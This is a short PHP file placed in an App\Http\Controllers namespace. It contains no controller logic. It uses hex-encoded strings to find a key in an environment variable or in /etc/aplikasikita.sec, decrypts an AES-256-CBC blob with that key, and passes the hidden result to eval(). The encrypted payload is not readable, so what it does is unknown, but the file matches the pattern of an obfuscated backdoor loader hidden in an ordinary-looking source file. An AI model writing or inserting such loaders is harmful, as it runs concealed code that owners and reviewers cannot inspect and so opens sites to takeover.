<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gs0dquVZ62PrwBkXxR7URA==');

$c=base64_decode(

'gqTEQpoqJSHa57GP+YCA3HGLJGtWCa/Tbk4dc4FwGaFSdN7Pc/w3k5YbroC0fWSLiS47pCo9w1Y9' .
'EZMWz7dUCbHCSvbryA2xC7SmWaP/gvf1uY50zJfe7iF8QJSw9TN6XxOiif4gZDgcEi34kjoz3da6' .
'nfgm21RqZLB8XD72Gu/hmKcn5h0SRYeSUSxNgmPQGvuhG2FVbUywHpCPppWLIf1f8fpU5OalDzCJ' .
'rIysZZYebhBiRfQhNTrqpVgNiXBigaO6P5jkhWNoETKwHzl31vCn/HkIWtTt3DbDXfhs3IqHOIz+' .
'Oq7jUTDn7xrX5d4F7jr7J5CDMjUrqSGj7MPBss7PG2guXL6GDu8gqnjIfEEivESzlnOO/7umzvsk' .
'TCNr9bkNiLsFmSbfpxvZw/yEYQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

